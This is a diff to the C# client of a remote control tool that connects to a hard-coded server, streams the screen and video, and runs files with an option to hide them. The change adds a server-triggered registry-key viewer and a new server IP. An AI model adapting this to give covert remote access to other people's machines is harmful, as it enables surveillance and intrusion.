@@ -18,6 +18,7 @@ using RemoteControl.Protocals.Plugin;
 using RemoteControl.Protocals.Utilities;
 using System.Net;
 using RemoteControl.Protocals.Response;
+using Microsoft.Win32;
 
 namespace RemoteControl.Client
 {
@@ -27,7 +28,7 @@ namespace RemoteControl.Client
         private static SocketSession oServerSession;
         private static bool isTestMode = true;
         //private static string ServerIP = "10.55.200.187";
-        private static string ServerIP = "192.168.0.105";
+        private static string ServerIP = "192.168.0.104";
         private static int ServerPort = 10086;
         private static Dictionary<string, RequestStartGetScreen> sessionScreenHandleSwitch = new Dictionary<string, RequestStartGetScreen>();
         private static Dictionary<string, bool> sessionVideoHandleSwitch = new Dictionary<string, bool>();
@@ -42,15 +43,22 @@ namespace RemoteControl.Client
         private static Dictionary<string, List<byte>> codePluginDic = new Dictionary<string, List<byte>>();
         private static bool isClosing = false;
         private static Thread heartbeatThread = null;
+        private static Dictionary<ePacketType, IRequestHandler> handlers = new Dictionary<ePacketType, IRequestHandler>();
 
         static void Main(string[] args)
         {
             Console.Title = "RC";
             ReadParameters();
+            InitHandlers();
             StartConnect();
             heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
             heartbeatThread.Start();
             StartMonitor();
+        }
+
+        static void InitHandlers()
+        {
+            handlers.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, new RequestViewRegistryKeyHandler());
         }
 
         static void ReadParameters()
@@ -644,6 +652,10 @@ namespace RemoteControl.Client
             {
                 var req = obj as RequestOpenFile;
                 ProcessUtil.Run(req.FilePath, "", req.IsHide, true);
+            }
+            else if (packetType == ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST)
+            {
+                handlers[packetType].Handle(session, obj);
             }
         }
 
